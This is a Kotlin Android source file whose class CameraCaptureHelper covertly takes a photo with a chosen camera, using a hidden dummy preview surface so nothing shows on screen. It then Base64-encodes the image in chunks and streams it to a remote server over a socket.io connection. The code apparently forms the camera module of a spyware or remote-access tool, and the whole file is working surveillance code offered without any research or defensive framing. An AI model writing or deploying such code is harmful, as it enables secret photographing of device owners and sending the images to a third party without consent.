package com.example.betryalcommit

import android.graphics.SurfaceTexture
import android.hardware.Camera
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.util.Log
import io.socket.client.Socket
import kotlinx.coroutines.DelicateCoroutinesApi
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.LinkedBlockingQueue

class CameraCaptureHelper {

    private val CHUNKSIZE = 1024 * 600 // Adjust this as needed

    @OptIn(DelicateCoroutinesApi::class)
    fun capture(socket: Socket, cameraId: Int) {
        val camera = Camera.open(cameraId)
        try {
            val holder = SurfaceTexture(0)
            camera.setPreviewTexture(holder)
            camera.startPreview()

            val chunksQueue = LinkedBlockingQueue<ByteArray>()

            camera.takePicture(null, null) { data, _ ->
                camera.release()

                GlobalScope.launch(Dispatchers.IO) {
                    val fileName = "Camera_back-${System.currentTimeMillis()}.png"
                    var offset = 0
                    while (offset < data.size) {
                        val chunkSize = minOf(CHUNKSIZE, data.size - offset)
                        val chunk = data.copyOfRange(offset, offset + chunkSize)
                        chunksQueue.put(chunk)
                        offset += chunkSize
                    }
                    while (!chunksQueue.isEmpty()) {
                        val chunk = chunksQueue.take()
                        val encodedChunk = Base64.encodeToString(chunk, Base64.DEFAULT)
                        socket.emit("imagez_chunk", encodedChunk, fileName)
                    }
                    socket.emit("imagez_end")

                    Log.d("CaptureHelper", "All chunks sent")
                }
            }
        } catch (e: Exception) {
            Log.e("error", e.toString())
            camera.release()
        }
    }
}
